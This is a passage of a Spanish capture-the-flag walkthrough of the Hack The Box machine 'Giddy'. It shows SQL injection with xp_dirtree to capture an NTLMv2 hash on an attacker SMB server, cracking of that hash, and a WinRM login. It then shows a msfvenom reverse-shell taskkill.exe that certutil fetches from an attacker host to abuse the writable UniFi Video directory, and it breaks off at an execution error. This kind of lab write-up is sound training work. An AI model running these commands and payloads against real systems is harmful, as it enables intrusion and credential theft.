|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|   h2
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2024-04-26T18:49:52+00:00<span class="p">;</span> <span class="nt">-7s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2024-04-26T18:49:46+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Giddy
| Not valid before: 2024-04-25T18:44:55
|_Not valid after:  2024-10-25T18:44:55
|_ssl-date: 2024-04-26T18:49:53+00:00<span class="p">;</span> <span class="nt">-6s</span> from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: <span class="nt">-6s</span>, deviation: 0s, median: <span class="nt">-6s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Nos estamos enfrentando a un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme rdp 10.129.96.140
RDP         10.129.96.140   3389   GIDDY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 or Windows Server 2016 Build 14393 <span class="o">(</span>name:GIDDY<span class="o">)</span> <span class="o">(</span>domain:Giddy<span class="o">)</span> <span class="o">(</span>nla:True<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estas son las tecnologías que corre por detrás la pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/1.png" />
</p>

<ul>
  <li>Si damos <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos lleva aquí.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/2.png" />
</p>

<ul>
  <li>La razón es por que en el código fuente hay una etiqueta la cual al dar <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos redirige a esa ruta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/3.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos rutas interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.96.140 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.129.96.140
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fremote]
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/mvc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.96.140/mvc/]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fRemote]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fcommunity <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fradar   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a2               <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/login%3f             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fjeremiahgrossman <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fweblog  <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fswik    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
Progress: 220546 / 220547 <span class="o">(</span>100.00%<span class="o">)</span>
<span class="o">===============================================================</span>
Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<ul>
  <li>Bueno si nos vamos a la parte de <code class="language-plaintext highlighter-rouge">Remote</code> encontramos esto pero no tenemos credenciales.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/4.png" />
</p>

<ul>
  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">mvc</code> nada interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/5.png" />
</p>

<h2 id="sql-injection">SQL Injection</h2>

<ul>
  <li>Si selecciono un producto la <strong>URL</strong> ya es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/6.png" />
</p>

<ul>
  <li>Si pongo una <code class="language-plaintext highlighter-rouge">'</code> después de <code class="language-plaintext highlighter-rouge">id=28</code>  nos devuelve un error además de que vemos un usuario <code class="language-plaintext highlighter-rouge">jnogueira</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/7.png" />
</p>

<ul>
  <li>
    <p>Estamos ante una maquina Windows a si que lo que podemos hacer es jugar con el <code class="language-plaintext highlighter-rouge">xp_dirtree</code> sabiendo que corre <code class="language-plaintext highlighter-rouge">mysql</code> por detrás <a href="https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server">https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server</a>.</p>
  </li>
  <li>
    <p>Si vemos el recurso vemos que comparten una <code class="language-plaintext highlighter-rouge">query</code> que al parecer se esta usando para robar el hash NTLMv2 de algún usuario ya que se conecta algún recurso compartido podemos nosotros compartir uno para intentarlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Pero nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/8.png" />
</p>

<ul>
  <li>Si revisamos el error nos dice <code class="language-plaintext highlighter-rouge">Incorrect syntar near '</code> así que vamos a probar quitándole la <code class="language-plaintext highlighter-rouge">'</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/9.png" />
</p>

<ul>
  <li>Y funciona nos llega el hash del usuario <code class="language-plaintext highlighter-rouge">Stacy</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:fd090e689929af2ccc006414acc9091c:01010000000000000050ab281298da0166fd32f6cb3311030000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f004700740061004100070008000050ab281298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:2d920fc42f14ee67db3416f7bfb13486:010100000000000080e643291298da01927a3a66ded6d3fe0000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f0047007400610041000700080080e643291298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
</code></pre></div></div>

<h2 id="stacy">Stacy</h2>

<ul>
  <li>Vamos a crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
xNnWo6272k7x     <span class="o">(</span>Stacy<span class="o">)</span>
1g 0:00:00:16 DONE <span class="o">(</span>2024-04-26 13:47<span class="o">)</span> 0.05899g/s 158644p/s 158644c/s 158644C/s xabat..x9831915x
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">Stacy</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>
SMB         10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> None <span class="o">(</span>name:10.129.96.140<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
HTTP        10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.140:5985/wsman
WINRM       10.129.96.140   5985   NONE             <span class="o">[</span>+] None<span class="se">\s</span>tacy:xNnWo6272k7x <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>giddy<span class="se">\s</span>tacy
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Vemos la primera flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e7d6583b3852e4219ee8c8e1b83aa588
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si recordamos tenemos Un <code class="language-plaintext highlighter-rouge">Windows PowerShell Web Access</code> así que podemos conectarnos por allí también.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/12.png" />
</p>

<ul>
  <li>Pero básicamente es lo mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/13.png" />
</p>

<ul>
  <li>Encontramos un archivo interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        6/17/2018   9:36 AM              6 unifivideo
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/giddy/14.png" />
</p>

<ul>
  <li>Tiene vulnerabilidades.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content searchsploit unifi video
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                        |  Path
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Ubiquiti Networks UniFi Video Default | php/webapps/39268.java
Ubiquiti UniFi Video 3.7.3 - Local Pr | windows/local/43390.txt
<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<ul>
  <li>Si examinamos el <code class="language-plaintext highlighter-rouge">windows/local/43490.txt</code> nos dice donde esta instalado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5. VULNERABILITY DETAILS
<span class="o">========================</span>
Ubiquiti UniFi Video <span class="k">for </span>Windows is installed to <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-v
ideo</span><span class="se">\"</span><span class="s2">
by default and is also shipped with a service called "</span>Ubiquiti UniFi Vid
eo<span class="s2">". Its
executable "</span>avService.exe<span class="s2">" is placed in the same directory and also runs
 under
the NT AUTHORITY/SYSTEM account.
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Además nos dicen que tenemos capacidad de escritura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>However the default permissions on the <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video"</span> <span class="nb">fold
</span>er are
inherited from <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData"</span> and are not explicitly overridden, which
 allows
all <span class="nb">users</span>, even unprivileged ones, to append and write files to the appl
ication
directory:

c:<span class="se">\P</span>rogramData&gt;icacls unifi-video
unifi-video NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD,AD,WEA,WA<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y si es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">echo </span>prueba <span class="o">&gt;</span> prueba
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        4/26/2024   2:48 PM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
<span class="nt">-a----</span>        4/26/2024   4:11 PM             18 prueba
<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
</code></pre></div></div>

<ul>
  <li>Nos dicen que cuando arrancas el servicio arranque un <code class="language-plaintext highlighter-rouge">.exe</code> que no existe en el directorio por defecto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Upon start and stop of the service, it tries to load and execute the file at
<span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video</span><span class="se">\t</span><span class="s2">askkill.exe"</span><span class="nb">.</span> However this file does not exist <span class="k">in
</span>the application directory by default at all.
</code></pre></div></div>

<ul>
  <li>
    <p>Lo que debemos hacer es crear ese <code class="language-plaintext highlighter-rouge">.exe</code>.</p>
  </li>
  <li>
    <p>Para crear binarios podemos usar <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.216 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: taskkill.exe
</code></pre></div></div>

<ul>
  <li>Ahora lo vamos a subir ala maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.216:8080/taskkill.exe taskkill.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  1c00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Si nos ponemos en escucha y lo ejecutamos para ver si nos llega una <code class="language-plaintext highlighter-rouge">reverse shell</code> vemos el siguiente error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; .<span class="se">\t</span>askkill.exe
The term <span class="s1">'.\taskkill.exe'</span> is not recognized as the name of a cmdlet, <span class="k">function</span>, script file, or operable program. Check the spelling of the name, or <span class="k">if </span>a path was included, verify that the path is correct and try again.
At line:1 char:1
+ .<span class="se">\t</span>askkill.exe
+ ~~~~~~~~~~~~~~
